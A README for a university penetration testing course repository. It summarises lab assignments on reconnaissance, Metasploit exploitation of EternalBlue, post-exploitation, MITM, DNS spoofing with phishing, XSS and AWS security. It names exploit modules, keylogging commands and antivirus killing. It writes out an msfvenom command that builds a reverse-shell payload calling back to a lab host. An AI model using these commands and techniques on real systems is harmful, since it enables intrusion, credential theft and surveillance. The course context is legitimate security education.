# CMPT 782 - Penetration Testing Course

This repository contains assignments from a cybersecurity course focused on simulating real-world attacks on software systems to assess security risks. The course emphasized hands-on penetration testing skills, including vulnerability discovery, exploitation, and analyzing post-exploitation impact.

## Table of Contents

- [Assignment 1: Information Gathering](#assignment-1-information-gathering)
- [Assignment 2: Vulnerability Exploitation with Metasploit](#assignment-2-vulnerability-exploitation-with-metasploit)
- [Assignment 3: Post-Exploitation Techniques](#assignment-3-post-exploitation-techniques)
- [Assignment 4: Man-in-the-Middle Attacks](#assignment-4-man-in-the-middle-attacks)
- [Assignment 5: DNS Spoofing and Social Engineering](#assignment-5-dns-spoofing-and-social-engineering)
- [Assignment 6: Cross-Site Scripting and Browser Exploitation](#assignment-6-cross-site-scripting-and-browser-exploitation)
- [Assignment 7: Web Application Vulnerabilities](#assignment-7-web-application-vulnerabilities)
- [Assignment 8: AWS Cloud Infrastructure](#assignment-8-aws-cloud-infrastructure)
- [Assignment 9: Infrastructure as Code with Terraform](#assignment-9-infrastructure-as-code-with-terraform)
- [Assignment 10: Serverless Architecture with AWS Lambda](#assignment-10-serverless-architecture-with-aws-lambda)
- [Assignment 11: IAM Auditing and Security Monitoring](#assignment-11-iam-auditing-and-security-monitoring)

---

## Assignment 1: Information Gathering

**Goal**: Learn passive and active reconnaissance techniques to gather information about targets before exploitation.

**What I Did**:
- Performed OSINT on ServiceNow using search engines, Censys, and SpiderFoot to gather corporate information, social media presence, and compliance certifications (GDPR, CCPA, ISO 27001, SOC 2)
- Used `dig` to interrogate DNS records, finding the IP address for www.sfu.com (142.58.143.9) and understanding CNAME records
- Performed non-recursive DNS queries to manually traverse the DNS hierarchy from root servers to authoritative nameservers
- Mapped the local network 10.13.37.0/24 with Nmap, identifying 3 active hosts
- Conducted TCP SYN scans and full TCP scans to enumerate open ports
- Performed OS detection on target systems, identifying Windows 7
- Used Nmap NSE script `smb-vuln-ms17-010` to detect the EternalBlue vulnerability
- Ran a comprehensive Nessus vulnerability scan that identified critical vulnerabilities including BlueKeep (CVE-2019-0708), EternalBlue, MS14-066, and MS12-020

**Tools & Techniques**: OSINT tools (Censys, SpiderFoot), DNS interrogation (dig), network scanning (Nmap), vulnerability scanning (Nessus)

**Outcome**: Successfully created a complete profile of the target network and identified multiple critical vulnerabilities that could be exploited in subsequent assignments. This phase demonstrated the importance of thorough reconnaissance before launching attacks.

---

## Assignment 2: Vulnerability Exploitation with Metasploit

**Goal**: Exploit identified vulnerabilities using the Metasploit Framework and gain remote access to target systems.

**What I Did**:
- Conducted an auxiliary attack using the `auxiliary/scanner/rdp/cve_2019_0708_bluekeep` module to verify the BlueKeep vulnerability by binding the MS_T120 channel
- Exploited the MS17-010 EternalBlue vulnerability (CVE-2017-0144) using `exploit/windows/smb/ms17_010_eternalblue` with RHOSTS=10.13.37.104 and LHOST=10.13.37.103
- Successfully gained a Meterpreter session on the Windows 7 target
- Practiced Meterpreter session management including backgrounding sessions, listing active sessions, and reconnecting to specific sessions
- Used `keyscan_start`, `keyscan_dump`, and `keyscan_stop` for keylogging
- Ran `ps` to list running processes (useful for identifying high-privilege processes for payload injection)
- Used `screenshare` to view the target's screen in real-time
- Created a custom payload with MSFvenom: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.13.37.103 LPORT=4449 -f exe -o payload.exe`
- Set up a fake download page served via Apache2 to deliver the payload
- Configured a multi/handler listener on port 4449 and successfully caught the reverse shell when the victim executed the payload

**Tools & Techniques**: Metasploit Framework, auxiliary modules, exploit modules, Meterpreter payloads, MSFvenom, multi/handler, Apache2 web server

**Outcome**: Gained hands-on experience with both automated exploitation (Metasploit modules) and manual payload delivery (social engineering approach). Learned that MSFvenom provides more flexibility for customization and is more practical for phishing scenarios compared to direct Metasploit exploits.

---

## Assignment 3: Post-Exploitation Techniques

**Goal**: Learn techniques to maintain access, escalate privileges, and extract sensitive information after initial compromise.

**What I Did**:
- Performed process migration in Meterpreter to move from unstable processes to stable system processes
- Identified and killed antivirus processes to avoid detection
- Escalated privileges from standard user to SYSTEM-level access
- Established persistence mechanisms to maintain access across reboots
- Harvested credentials from the compromised system
- Manipulated user credentials and extracted password hashes

**Tools & Techniques**: Meterpreter post-exploitation modules, process migration, privilege escalation techniques, credential harvesting, persistence mechanisms

**Outcome**: Understanding post-exploitation is just as important as the initial compromise. Learned techniques to maintain long-term access and how attackers pivot through a network after gaining an initial foothold.

---

## Assignment 4: Man-in-the-Middle Attacks

**Goal**: Intercept and manipulate network traffic between a victim and the internet using ARP spoofing and protocol downgrade attacks.

**What I Did**:
- Configured a three-machine setup: Kali (attacker), Windows 7 (victim), and a router
- Used BetterCAP to perform ARP spoofing, poisoning the victim's ARP cache to route traffic through my attacker machine
- Captured POST requests containing credentials using Wireshark
- Implemented SSL Strip to downgrade HTTPS connections to HTTP, making encrypted credentials visible in plain text
- Used mitmproxy to intercept and manipulate HTTPS traffic by installing custom SSL certificates
- Analyzed the effectiveness and limitations of each approach

**Tools & Techniques**: BetterCAP, ARP spoofing, Wireshark packet capture, SSL Strip, mitmproxy, certificate manipulation

**Outcome**: Gained practical understanding of network-layer attacks and why HTTPS is critical for security. Learned that even HTTPS can be compromised if attackers can manipulate certificates or downgrade connections, emphasizing the importance of HSTS and certificate pinning.

---

## Assignment 5: DNS Spoofing and Social Engineering

**Goal**: Redirect victims to malicious websites using DNS spoofing and harvest credentials through social engineering.

**What I Did**:
- Used BetterCAP's `dns.spoof` module to poison DNS responses and redirect victims to attacker-controlled servers
- Set up the Social Engineering Toolkit (SET) credential harvester to clone legitimate websites
- Combined DNS spoofing with SET to redirect victims to fake login pages that captured their credentials
- Analyzed DNS cache poisoning and how it persists across multiple requests
- Researched DNS security mechanisms including DNSSEC, DNS over HTTPS (DoH), and DNS over TLS (DoT)
- Evaluated the effectiveness of these countermeasures against spoofing attacks

**Tools & Techniques**: BetterCAP dns.spoof module, Social Engineering Toolkit (SET), website cloning, DNS cache poisoning, DNSSEC

**Outcome**: DNS is a fundamental but often overlooked attack vector. Combining DNS spoofing with social engineering creates convincing attacks that are difficult for users to detect. Modern DNS security protocols like DoH and DNSSEC provide defenses, but aren't universally deployed.

---

## Assignment 6: Cross-Site Scripting and Browser Exploitation

**Goal**: Exploit XSS vulnerabilities to inject malicious JavaScript and gain control over victim browsers.

**What I Did**:
- Identified and exploited XSS vulnerabilities in a Docker-hosted web application
- Stole session cookies by injecting JavaScript that exfiltrated cookie data
- Injected BeEF (Browser Exploitation Framework) hook.js payload into victim browsers
- Used BetterCAP to perform network-level JavaScript injection on HTTP traffic
- Configured mitmproxy with custom SSL certificates to inject JavaScript into HTTPS connections
- Leveraged BeEF's command modules to control hooked browsers and execute various attacks

**Tools & Techniques**: XSS exploitation, BeEF (Browser Exploitation Framework), JavaScript injection, BetterCAP, mitmproxy, Docker, cookie theft

**Outcome**: XSS vulnerabilities are more dangerous than they initially appear. Once you have JavaScript execution in a victim's browser context, you can steal sessions, hook browsers for persistent control, and pivot to other attacks. Network-level injection extends these attacks beyond vulnerable websites to any HTTP(S) traffic.

---

## Assignment 7: Web Application Vulnerabilities

**Goal**: Exploit common web application vulnerabilities including SQL injection, IDOR, SSTI, and insecure deserialization.

**What I Did**:
- Performed SQL injection attacks both manually and using sqlmap to extract database contents
- Exploited Insecure Direct Object Reference (IDOR) vulnerabilities to access unauthorized resources by manipulating URL parameters
- Leveraged Server-Side Template Injection (SSTI) to execute arbitrary code on the server through template rendering engines
- Exploited insecure deserialization vulnerabilities to achieve remote code execution and establish a reverse shell
- Worked with Docker containers running Node.js and Flask backend servers

**Tools & Techniques**: SQL injection, sqlmap, IDOR exploitation, SSTI (Server-Side Template Injection), insecure deserialization, reverse shells, Docker, Node.js, Flask

**Outcome**: Web applications have a large attack surface with many potential vulnerability classes. Each vulnerability type requires different exploitation techniques, but they all stem from improper input validation and trust in user-controlled data. Understanding these attacks helps in writing more secure code.

---

## Assignment 8: AWS Cloud Infrastructure

**Goal**: Learn AWS fundamentals and build secure cloud infrastructure with proper networking and access controls.

**What I Did**:
- Created IAM users, groups, roles, and policies to implement least-privilege access control
- Launched and configured EC2 instances for hosting applications
- Set up DynamoDB tables for NoSQL data storage
- Built a complete VPC (Virtual Private Cloud) from scratch with public and private subnets
- Configured Internet Gateway for public subnet internet access
- Set up NAT Gateway to allow private subnet instances to access the internet while remaining unreachable from the outside
- Created Security Groups to control instance-level traffic (stateful firewall)
- Configured Network ACLs for subnet-level traffic control (stateless firewall)
- Built Route Tables to direct traffic between subnets, gateways, and the internet
- Deployed a web application on EC2 with proper SSH access configuration

**Tools & Techniques**: AWS IAM, EC2, DynamoDB, VPC, subnets, Internet Gateway, NAT Gateway, Security Groups, Network ACLs, Route Tables, SSH

**Outcome**: Cloud infrastructure requires a different security mindset than traditional networks. Understanding the relationship between VPCs, subnets, route tables, and security controls is essential for building secure AWS environments. Proper IAM configuration is critical to prevent privilege escalation and unauthorized access.

---

## Assignment 9: Infrastructure as Code with Terraform

**Goal**: Recreate the AWS infrastructure from Assignment 8 using Terraform to learn infrastructure as code principles.

**What I Did**:
- Wrote Terraform configuration files (.tf) to define infrastructure declaratively
- Created `vpc.tf` to define the Virtual Private Cloud
- Built `subnets.tf` to configure public and private subnets
- Configured `gateways.tf` for Internet Gateway setup
- Set up `nat-gateway.tf` for NAT Gateway configuration
- Defined `route-tables.tf` to manage network routing
- Created `security-groups.tf` to define firewall rules
- Built `ec2.tf` to launch and configure EC2 instances
- Created `ami.tf` to specify Amazon Machine Images
- Used `main.tf` as the entry point with provider configuration
- Managed state with Terraform state files to track infrastructure changes

**Tools & Techniques**: Terraform, HCL (HashiCorp Configuration Language), AWS provider, infrastructure as code, state management

**Outcome**: Infrastructure as code transforms infrastructure management from manual, error-prone processes to repeatable, version-controlled deployments. Terraform's declarative approach makes it easy to understand infrastructure at a glance and maintain consistency across environments. The state file is critical for tracking changes and preventing drift.

---

## Assignment 10: Serverless Architecture with AWS Lambda

**Goal**: Build a serverless comment API using AWS Lambda, API Gateway, and other AWS managed services.

**What I Did**:
- Created AWS Lambda functions to handle application logic without managing servers
- Set up API Gateway with GET and POST endpoints to expose Lambda functions as HTTP APIs
- Implemented AWS Cognito for user authentication and JWT token generation
- Configured JWT validation to secure API endpoints
- Integrated SNS (Simple Notification Service) for sending notifications
- Used EventBridge (CloudWatch Events) for scheduling automated Lambda executions
- Wrote Lambda function code in JavaScript (Task3.js) to handle comment creation and retrieval
- Tested the complete serverless workflow from authentication to data persistence

**Tools & Techniques**: AWS Lambda, API Gateway, Cognito, JWT authentication, SNS, EventBridge, serverless architecture, JavaScript

**Outcome**: Serverless architecture eliminates infrastructure management overhead and scales automatically. The event-driven model is powerful for building APIs and background processing tasks. However, it requires rethinking application design around stateless functions and managed services. JWT tokens and Cognito integration provide a robust authentication solution without managing auth infrastructure.

---

## Assignment 11: IAM Auditing and Security Monitoring

**Goal**: Audit AWS IAM configurations and automate security monitoring using CloudTrail and Lambda.

**What I Did**:
- Generated and analyzed IAM credential reports to identify security issues with users, groups, and policies
- Reviewed password policies, MFA status, and access key age
- Created Lambda functions (lambda_function.py) to automate security audits
- Implemented role assumption to grant Lambda appropriate permissions for security scanning
- Audited CIS AWS Foundations Benchmark controls including:
  - Control 1.1: Avoid root account usage
  - Control 1.2: MFA enabled on root account
  - Control 1.12: Root account credentials not used for 90 days
- Configured SNS to send security audit reports and alerts
- Analyzed CloudTrail event history to track API calls and detect suspicious activity
- Built automated security monitoring workflows triggered by CloudTrail events

**Tools & Techniques**: IAM credential reports, AWS Lambda, Python, role assumption, CloudTrail, SNS, CIS AWS Foundations Benchmark, security automation

**Outcome**: Security monitoring and auditing must be automated to scale effectively in cloud environments. CloudTrail provides a complete audit log of AWS API calls, which is essential for forensics and compliance. Lambda functions can continuously monitor for security issues and alert on violations. Following frameworks like CIS Benchmarks provides a structured approach to securing AWS accounts.

---

## Repository Structure

Each assignment folder contains:
- **Assignment PDF**: Original assignment instructions and objectives
- **Submission PDF**: My completed work, screenshots, and analysis
- **Supporting Files**: Code files, scripts, and configuration files where applicable (e.g., Terraform .tf files in A9, Lambda code in A10-A11)

## Skills Developed

Throughout this course, I developed practical skills in:
- Penetration testing methodology (reconnaissance, exploitation, post-exploitation)
- Network security and protocol analysis
- Web application security testing
- Cloud security and AWS infrastructure
- Infrastructure as code and automation
- Security monitoring and compliance auditing
- Exploit development and payload creation
- Social engineering techniques
- Defensive security considerations
